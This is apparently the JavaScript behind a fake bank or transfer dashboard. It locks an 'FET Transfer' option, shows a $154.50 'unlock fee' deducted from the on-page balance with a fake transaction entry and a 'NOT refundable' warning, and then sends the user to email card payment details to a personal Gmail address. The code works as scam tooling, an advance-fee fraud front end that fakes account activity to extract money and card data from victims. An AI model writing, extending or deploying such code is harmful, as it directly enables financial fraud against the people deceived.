document.addEventListener("DOMContentLoaded", () => {
  let feeDeducted = false; // lock so deduction happens only once

  // 1. Add lock symbol to FET Transfer option
  document.querySelectorAll(".dropdown-option").forEach((option) => {
    if (option.getAttribute("data-option") === "FET Transfer") {
      if (!option.querySelector("#fetLockIcon")) {
        option.insertAdjacentHTML(
          "beforeend",
          `<span id="fetLockIcon" style="margin-left:6px; color:red; font-weight:bold;">🔒</span>`
        );
      }

      // On click, open first popup
      option.addEventListener("click", (e) => {
        e.preventDefault();
        document.getElementById("fetLockedPopup1").style.display = "flex";
      });
    }
  });

  // 2. Handle first popup (deduct half of $309 = $154.5)
  document.getElementById("openUnlockPopup").addEventListener("click", () => {
    const deductionAmount = 154.5;

    if (!feeDeducted) {
      feeDeducted = true; // lock so it only happens once

      const currentBalanceEl = document.getElementById("currentBalance");
      const availableBalanceEl = document.getElementById("availableBalance");

      // Parse current balances
      let currentAmount = parseFloat(
        currentBalanceEl.textContent.replace(/[$,]/g, "")
      );
      let availableAmount = parseFloat(
        availableBalanceEl.textContent.replace(/[$,]/g, "")
      );

      // Deduct
      currentAmount -= deductionAmount;
      availableAmount -= deductionAmount;

      // Update balances
      currentBalanceEl.textContent =
        "$" +
        currentAmount.toLocaleString("en-US", { maximumFractionDigits: 2 });
      availableBalanceEl.textContent =
        "$" +
        availableAmount.toLocaleString("en-US", { maximumFractionDigits: 2 });

      // Add to transaction history
      const transactionList = document.getElementById("transactionsList");
      if (transactionList) {
        const transactionItem = document.createElement("div");
        transactionItem.className = "transaction-item";
        transactionItem.innerHTML = `
          <div class="transaction-amount">-$${deductionAmount.toFixed(2)}</div>
          <div class="transaction-type">FET Unlock Fee</div>
          <div class="transaction-date">${new Date().toLocaleString()}</div>
        `;
        transactionList.prepend(transactionItem);
      }
    }

    // ✅ Styled notification popup for "Not refundable"
    const notification = document.createElement("div");
    notification.textContent =
      "⚠️ $154.5 deducted successfully. This fee is NOT refundable.";
    notification.style.position = "fixed";
    notification.style.top = "20px";
    notification.style.left = "50%";
    notification.style.transform = "translateX(-50%)";
    notification.style.background = "#ffdddd";
    notification.style.color = "#b30000";
    notification.style.padding = "15px 25px";
    notification.style.border = "1px solid #b30000";
    notification.style.borderRadius = "8px";
    notification.style.fontWeight = "bold";
    notification.style.zIndex = "9999";
    notification.style.boxShadow = "0 4px 12px rgba(0,0,0,0.2)";
    document.body.appendChild(notification);

    // Remove notification after 4 seconds, then show popup 2
    setTimeout(() => {
      notification.remove();
      document.getElementById("fetLockedPopup1").style.display = "none";
      document.getElementById("fetLockedPopup2").style.display = "flex";
    }, 4000);
  });

  // 3. Email Payment Redirect
  document
    .getElementById("completeEmailPayment")
    .addEventListener("click", () => {
      const subject = encodeURIComponent("FET Sequence Unlock Completion Fee");
      const body = encodeURIComponent(
        "Provide a Total of $154.5 Sequence Unlocking FET fee\n\n" +
          "_________________________\n" +
          "Attach all complete Card Payment"
      );
      window.location.href = `mailto:trevo02.official@gmail.com?subject=${subject}&body=${body}`;
    });

  // 4. Close popup buttons
  document.querySelectorAll(".closePopup").forEach((btn) => {
    btn.addEventListener("click", () => {
      btn.closest(".fet-popup").style.display = "none";
    });
  });
});
